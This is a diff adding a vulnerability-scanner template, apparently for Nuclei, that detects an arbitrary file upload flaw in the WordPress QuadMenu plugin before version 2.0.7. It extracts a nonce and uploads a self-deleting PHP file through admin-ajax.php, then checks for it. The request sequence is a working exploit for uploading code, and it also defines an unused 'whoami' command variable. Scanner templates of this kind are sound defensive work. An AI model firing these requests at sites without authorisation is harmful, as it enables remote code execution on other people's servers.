@@ -1,0 +1,63 @@
+id: wordpress-quadmenu-file-upload
+info:
+  name: WordPress Plugin QuadMenu Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WordPress Plugin QuadMenu <2.0.7 has an arbitrary file upload vulnerability. The vulnerability is due to compiler_save not verifying the suffix of the uploaded file, allowing attackers to upload malicious files.
+  reference:
+    - https://wpscan.com/vulnerability/a69ead38-93ed-460d-ba1d-0e1446850ef4
+  tags: fileupload,wordpress
+variables:
+  cmd: "whoami"
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: nonce
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - 'var quadmenu = \{"nonce":"(.*?)","gutter":'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "var quadmenu = {\"nonce\":"
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=quadmenu_compiler_save&nonce={{nonce}}&output[imports][0]=info.php&output[css]=<?php echo md5(233);unlink(__FILE__);?>
+    extractors:
+      - type: regex
+        name: upload_path
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - '/wp-content\\/uploads\\/(.*?)\\/info.php'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "/wp-content\\/uploads\\/"
+  - raw:
+      - |
+        GET /wp-content/uploads/{{upload_path}}/info.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
